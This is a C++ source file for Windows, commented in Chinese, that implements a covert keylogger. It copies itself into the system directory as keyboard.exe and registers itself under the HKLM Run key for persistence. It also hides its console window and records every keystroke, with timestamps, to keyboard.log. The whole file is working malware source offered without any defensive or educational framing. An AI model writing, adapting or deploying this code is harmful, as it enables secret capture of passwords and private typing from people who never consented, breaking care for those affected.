#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <ctime>
#include <Winuser.h>
#include <string>
#include <fstream>
using namespace std;
const int KeyBoardValue = 0x80000000;
string GetKeyName(int);
time_t timer = time(0);
time_t time_diff;
bool JudgeShift();

int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{
  char system[MAX_PATH];
  char pathtofile[MAX_PATH];

  HMODULE GetModH = GetModuleHandle(NULL);

  GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
  GetSystemDirectory(system, sizeof(system));

  strcat(system, "\\keyboard.exe");

  CopyFile(pathtofile, system, false);

  HKEY hKey;

  RegOpenKeyEx(HKEY_LOCAL_MACHINE,
               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
               KEY_SET_VALUE, &hKey);

  RegSetValueEx(hKey, "for_test", 0,
                REG_SZ, (const unsigned char *)system,
                sizeof(system));

  RegCloseKey(hKey);

  HWND hwnd;
  if (hwnd = ::FindWindow("ConsoleWindowClass", NULL))
    ::ShowWindow(hwnd, SW_HIDE);

  string FileName = "keyboard.log";
  string KeyName = "";
  fstream FileStream;
  FileStream.open(FileName.c_str(), ios::out | ios::trunc);
  time_diff = time(0) - timer;
  timer = time(0);
  char *dt = ctime(&timer);
  FileStream.write("[", 1);
  FileStream.write(dt, 4 * sizeof(dt) - 8);
  FileStream.write("] ", 2);
  FileStream.write("\n", 1);
  FileStream.close();
  while (1)
  {
    Sleep(1);
    for (int i = 8; i <= 255; i++)
    {
      if (GetAsyncKeyState(i) & 1 == 1)
      //判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
      {
        time_diff = time(0) - timer;
        timer = time(0);
        char *dt = ctime(&timer);
        if (time_diff > 60)
        {
          FileStream.write("\n", 1);
          FileStream.write("[", 1);
          FileStream.write(dt, 4 * sizeof(dt) - 8);
          FileStream.write("] ", 2);
          FileStream.write("\n", 1);
          FileStream.close();
        }

        KeyName = GetKeyName(i);
        FileStream.write(KeyName.c_str(), KeyName.size());
        FileStream.close(); //写完一次就保存一次
        FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
        if (KeyName == "return")
        {
          FileStream.write("\nreturn", 1);
          FileStream.close();
          return 0;
        }
      }
    }
  }
  return 0;
}
string GetKeyName(int NumKey)
{
  bool useShift = 0;
  bool IS_SHIFT = JudgeShift();
  string revalue = "";
  //判断键盘中间的特殊符号
  if (NumKey >= 186 && NumKey <= 222)
    switch (NumKey)
    {
    case 186:
      if (IS_SHIFT)
        revalue = ":",useShift = 1;
      else revalue = ";";
      break;
    case 187:
      if (IS_SHIFT)
        revalue = "+",useShift = 1;
      else revalue = "=";
      break;
    case 188:
      if (IS_SHIFT)
        revalue = "<",useShift = 1;
      else revalue = ",";
      break;
    case 189:
      if (IS_SHIFT)
        revalue = "_",useShift = 1;
      else revalue = "-";
      break;
    case 190:
      if (IS_SHIFT)
        revalue = ">",useShift = 1;
      else revalue = ".";
      break;
    case 191:
      if (IS_SHIFT)
        revalue = "?", useShift= 1;
      else revalue = "/";
      break;
    case 192:
      if (IS_SHIFT)
        revalue = "~",useShift = 1;
      else revalue = "`";
      break;
    case 219:
      if (IS_SHIFT)
        revalue = "{",useShift = 1;
      else revalue = "[";
      break;
    case 220:
      if (IS_SHIFT)
        revalue = "|",useShift = 1;
      else revalue = "\\";
      break;
    case 221:
      if (IS_SHIFT)
        revalue = "}",useShift = 1;
      else revalue = "]";
      break;
    case 222:
      if (IS_SHIFT)
        revalue = '"',useShift = 1;
      else revalue = ",";
    default:
      revalue = "error";
      break;
    }

  if (NumKey == VK_ESCAPE) // 退出
    revalue = "[Esc]";
  else if (NumKey == VK_F1) // F1至F12
    revalue = "[F1]";
  else if (NumKey == VK_F2)
    revalue = "[F2]";
  else if (NumKey == VK_F3)
    revalue = "[F3]";
  else if (NumKey == VK_F4)
    revalue = "[F4]";
  else if (NumKey == VK_F5)
    revalue = "[F5]";
  else if (NumKey == VK_F6)
    revalue = "[F6]";
  else if (NumKey == VK_F7)
    revalue = "[F7]";
  else if (NumKey == VK_F8)
    revalue = "[F8]";
  else if (NumKey == VK_F9)
    revalue = "[F9]";
  else if (NumKey == VK_F10)
    revalue = "[F10]";
  else if (NumKey == VK_F11)
    revalue = "[F11]";
  else if (NumKey == VK_F12)
    revalue = "[F12]";
  else if (NumKey == VK_SNAPSHOT) // 打印屏幕
    revalue = "[PrScrn]";
  else if (NumKey == VK_SCROLL) // 滚动锁定
    revalue = "[Scroll Lock]";
  else if (NumKey == VK_PAUSE) // 暂停、中断
    revalue = "[Pause]";
  else if (NumKey == VK_CAPITAL) // 大写锁定
    revalue = "[Caps Lock]";
  else if (NumKey == 8) //<- 回格键
    revalue = "[Backspace]";
  else if (NumKey == VK_RETURN) // 回车键、换行
    revalue = "[Enter]\n";
  else if (NumKey == VK_SPACE) // 空格
    revalue = " ";
  else if (NumKey == VK_TAB) // 制表键
    revalue = "[Tab]";
  else if (NumKey == VK_LCONTROL) // 左控制键
    revalue = "[Ctrl]";
  else if (NumKey == VK_RCONTROL) // 右控制键
    revalue = "[CTRL]";
  else if (NumKey == VK_LMENU) // 左换档键
    revalue = "[Alt]";
  else if (NumKey == VK_LMENU) // 右换档键
    revalue = "[ALT]";
  else if (NumKey == VK_LWIN) // 右 WINDOWS 键
    revalue = "[Win]";
  else if (NumKey == VK_RWIN) // 右 WINDOWS 键
    revalue = "[WIN]";
  else if (NumKey == VK_APPS) // 键盘上 右键
    revalue = "[Right Button]";
  else if (NumKey == VK_INSERT) // 插入
    revalue = "[Insert]";
  else if (NumKey == VK_DELETE) // 删除
    revalue = "[Delete]";
  else if (NumKey == VK_HOME) // 起始
    revalue = "[Home]";
  else if (NumKey == VK_END) // 结束
    revalue = "[End]";
  else if (NumKey == VK_PRIOR) // 上一页
    revalue = "[PgUp]";
  else if (NumKey == VK_NEXT) // 下一页
    revalue = "[PgDown]";
  // 不常用的几个键:一般键盘没有
  else if (NumKey == VK_CANCEL) // Cancel
    revalue = "[Cancel]";
  else if (NumKey == VK_CLEAR) // Clear
    revalue = "[Clear]";
  else if (NumKey == VK_SELECT) // Select
    revalue = "[Select]";
  else if (NumKey == VK_PRINT) // Print
    revalue = "[Print]";
  else if (NumKey == VK_EXECUTE) // Execute
    revalue = "[Execute]";
  //----------------------------------------//
  else if (NumKey == VK_LEFT) //上、下、左、右键
    revalue = "[←]";
  else if (NumKey == VK_RIGHT)
    revalue = "[→]";
  else if (NumKey == VK_UP)
    revalue = "[↑]";
  else if (NumKey == VK_DOWN)
    revalue = "[↓]";
  else if (NumKey == VK_NUMLOCK) //小键盘数码锁定
    revalue = "[NumLock]";
  else if (NumKey == VK_ADD) // 加、减、乘、除
    revalue = "+";
  else if (NumKey == VK_SUBTRACT)
    revalue = "-";
  else if (NumKey == VK_MULTIPLY)
    revalue = "*";
  else if (NumKey == VK_DIVIDE)
    revalue = "/";
  else if (NumKey == 190 || NumKey == 110) // 小键盘 . 及键盘 .
    revalue = ".";
  //小键盘数字键:0-9
  else if (NumKey == VK_NUMPAD0)
    revalue = "0";
  else if (NumKey == VK_NUMPAD1)
    revalue = "1";
  else if (NumKey == VK_NUMPAD2)
    revalue = "2";
  else if (NumKey == VK_NUMPAD3)
    revalue = "3";
  else if (NumKey == VK_NUMPAD4)
    revalue = "4";
  else if (NumKey == VK_NUMPAD5)
    revalue = "5";
  else if (NumKey == VK_NUMPAD6)
    revalue = "6";
  else if (NumKey == VK_NUMPAD7)
    revalue = "7";
  else if (NumKey == VK_NUMPAD8)
    revalue = "8";
  else if (NumKey == VK_NUMPAD9)
    revalue = "9";
  else if (NumKey == VK_SHIFT && !useShift)
    revalue = "[Shift]";
  //----------------------------上述代码判断键盘上除了字母之外的功能键--------------------------------//
  else if (NumKey >= 65 && NumKey <= 90)
  {
    if (GetKeyState(VK_CAPITAL))
    {
      if (IS_SHIFT)
        revalue = NumKey + 32,useShift = 1;
      else revalue = NumKey;
    }
    else if (NumKey == VK_ESCAPE && IS_SHIFT)
    {
      revalue = "return";
      useShift = 1;
    }
    else
    {
      if (IS_SHIFT)
        revalue = NumKey,useShift = 1;
      else revalue = NumKey + 32;
    }
  }
  //---------------------------上面的部分判断键盘上的字母----------------------------------------------//
  else if (NumKey >= 48 && NumKey <= 57)
  {
    if (IS_SHIFT)
    {
      switch (NumKey)
      {
      case 48:
        revalue = ")";
        useShift = 1;
        break;
      case 49:
        revalue = "!";
        useShift = 1;
        break;
      case 50:
        revalue = "@";
        useShift = 1;
        break;
      case 51:
        revalue = "#";
        useShift = 1;
        break;
      case 52:
        revalue = "$";
        useShift = 1;
        break;
      case 53:
        revalue = "%";
        useShift = 1;
        break;
      case 54:
        revalue = "^";
        useShift = 1;
        break;
      case 55:
        revalue = "&";
        useShift = 1;
        break;
      case 56:
        revalue = "*";
        useShift = 1;
        break;
      case 57:
        revalue = "(";
        useShift = 1;
        break;
      }
    }
    else
    {
      switch (NumKey)
      {
      case 48:
        revalue = "0";
        break;
      case 49:
        revalue = "1";
        break;
      case 50:
        revalue = "2";
        break;
      case 51:
        revalue = "3";
        break;
      case 52:
        revalue = "4";
        break;
      case 53:
        revalue = "5";
        break;
      case 54:
        revalue = "6";
        break;
      case 55:
        revalue = "7";
        break;
      case 56:
        revalue = "8";
        break;
      case 57:
        revalue = "9";
        break;
      }
    }
  }

  return revalue;
}
bool JudgeShift()
{
  int iShift = GetKeyState(0x10);                      //判断Shift键状态
  bool IS = (iShift & KeyBoardValue) == KeyBoardValue; //表示按下Shift键
  if (IS)
    return 1;
  else
    return 0;
}
